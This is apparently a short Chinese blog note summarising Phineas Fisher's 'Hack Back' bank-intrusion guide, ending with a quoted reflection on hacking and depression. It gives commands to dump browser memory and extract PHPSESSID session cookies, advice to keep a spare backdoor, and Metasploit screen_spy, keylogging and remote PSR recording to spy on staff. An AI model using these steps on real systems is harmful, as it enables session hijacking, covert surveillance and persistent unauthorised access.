Title: How to Hack Bank
Category: Fun
Slug: hack-bank
Date: 2020-04-22

PS: 标题看上去很厉害-> 金玉其外，败絮其中

来源: <https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank>

###从浏览器dump登陆Cookie

```
procdump64 /accepteula -r -ma PID_of_browser
strings64 /accepteula * .dmp | findstr PHPSESSID 2> nul
findstr PHPSESSID * .dmp> tmp
strings64 /accepteula tmp | findstr PHPSESSID 2> nul
```
###准备个后路
1. 经常用来操作的access放在一个地方
2. 留一个备用的，不用的后门

###知己知彼

收集信息用到一下模块:

```
每5s截屏:
post/windows/gather/screen_spy

再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。


另外windows下有一个比较好用的监视器: PSR


psr.exe /start /gui 0 /output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe /stop;
```

<https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/>

##END

```
Hacking has made me feel alive. It started as a way to self-medicate depression. Later I realized that, in reality, I could do something positive. I don't regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn't continue living that way. So I began to spend more time away from my computer, with other people, learning to open myself to the world, to feel my emotions, to connect with others, to accept risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on my way.
```